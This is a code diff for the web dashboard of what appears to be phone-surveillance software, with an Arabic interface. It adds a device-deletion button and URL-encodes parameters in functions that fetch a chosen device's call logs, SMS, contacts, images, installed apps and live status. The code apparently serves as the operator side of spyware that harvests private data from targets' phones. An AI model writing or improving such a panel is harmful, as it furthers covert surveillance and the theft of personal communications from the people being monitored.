@@ -60,6 +60,33 @@ function checkNewSMS(newSMS) {
     lastSmsCount = newSMS.length;
 }
 
+// ✅ زر حذف الجهاز — يعمل
+async function deleteDevice() {
+    if (!currentDevice) {
+        alert('⚠️ اختر جهازًا أولًا');
+        return;
+    }
+    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
+    
+    try {
+        const response = await fetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
+        const result = await response.json();
+        
+        if (result.success) {
+            alert('✅ تم حذف الجهاز');
+            currentDevice = null;
+            document.getElementById('deviceSelect').value = '';
+            document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
+            document.getElementById('deviceNameDisplay').className = 'device-name-display';
+            loadDevices();
+        } else {
+            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
+        }
+    } catch (e) {
+        alert('❌ خطأ في الاتصال: ' + e.message);
+    }
+}
+
 async function loadDevices() {
     try {
         const response = await fetch('/devices.json');
@@ -120,7 +147,7 @@ function selectDevice(deviceId) {
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
-        const response = await fetch(`/live.php?device=${currentDevice}`);
+        const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
         
         const statusEl = document.getElementById('networkStatus');
@@ -148,7 +175,7 @@ async function loadAllData() {
 
 async function loadCalls() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
+        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
         const newCalls = await response.json();
         if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
             checkNewCalls(newCalls);
@@ -195,7 +222,7 @@ function backToCallsList() { currentCallNumber = null; displayCallsList(); }
 
 async function loadSMS() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
+        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
         const newSMS = await response.json();
         if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
             checkNewSMS(newSMS);
@@ -248,7 +275,7 @@ function backToConversations() { currentChat = null; displayConversations(); }
 
 async function loadContacts() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
+        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
         const newContacts = await response.json();
         if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
             allContacts = newContacts;
@@ -289,7 +316,7 @@ function backToContactsList() { currentContact = null; displayContactsList(); }
 
 async function loadImages() {
     try {
-        const response = await fetch(`/api.php?action=get_image_data&device=${currentDevice}`);
+        const response = await fetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
         const images = await response.json();
         const grid = document.getElementById('imagesGrid');
         grid.innerHTML = '';
@@ -314,7 +341,7 @@ async function loadImages() {
 
 async function loadApps() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
+        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
         const apps = await response.json();
         const tbody = document.querySelector('#appsTable tbody');
         tbody.innerHTML = '';
@@ -325,7 +352,7 @@ async function loadApps() {
 
 async function loadDeviceInfo() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
+        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
         const info = await response.json();
         const div = document.getElementById('deviceInfo');
         if (!info || Object.keys(info).length === 0) return;
